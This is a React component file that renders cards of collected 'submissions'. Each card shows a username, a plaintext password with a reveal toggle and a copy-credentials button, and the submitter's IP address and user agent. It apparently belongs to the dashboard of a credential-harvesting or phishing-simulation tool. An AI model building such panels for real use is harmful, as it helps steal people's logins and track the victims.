import { useState } from "react";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Clock, Eye, EyeOff, Copy, Check } from "lucide-react";
import type { Submission } from "@shared/schema";

interface SubmissionCardProps {
  submission: Submission;
}

export default function SubmissionCard({ submission }: SubmissionCardProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    const text = `Username: ${submission.username}\nPassword: ${submission.password}\nTimestamp: ${new Date(submission.timestamp).toLocaleString()}`;
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Card className="hover-elevate" data-testid={`card-submission-${submission.id}`}>
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <Clock className="h-4 w-4" />
            <span data-testid={`text-timestamp-${submission.id}`}>
              {new Date(submission.timestamp).toLocaleString()}
            </span>
          </div>
          <Button
            variant="ghost"
            size="icon"
            onClick={handleCopy}
            className="h-8 w-8"
            data-testid={`button-copy-${submission.id}`}
          >
            {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div>
          <p className="text-xs text-muted-foreground mb-1">Username</p>
          <p className="font-semibold" data-testid={`text-username-${submission.id}`}>
            {submission.username}
          </p>
        </div>

        <div>
          <div className="flex items-center justify-between mb-1">
            <p className="text-xs text-muted-foreground">Password</p>
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setShowPassword(!showPassword)}
              className="h-6 w-6"
              data-testid={`button-toggle-password-${submission.id}`}
            >
              {showPassword ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
            </Button>
          </div>
          <p className="font-mono text-sm" data-testid={`text-password-${submission.id}`}>
            {showPassword ? submission.password : "•".repeat(submission.password.length)}
          </p>
        </div>

        {(submission.ipAddress || submission.userAgent) && (
          <div className="pt-2 border-t border-border space-y-2">
            {submission.ipAddress && (
              <div>
                <p className="text-xs text-muted-foreground">IP Address</p>
                <p className="text-xs font-mono" data-testid={`text-ip-${submission.id}`}>
                  {submission.ipAddress}
                </p>
              </div>
            )}
            {submission.userAgent && (
              <div>
                <p className="text-xs text-muted-foreground">User Agent</p>
                <p className="text-xs truncate" data-testid={`text-useragent-${submission.id}`}>
                  {submission.userAgent}
                </p>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}
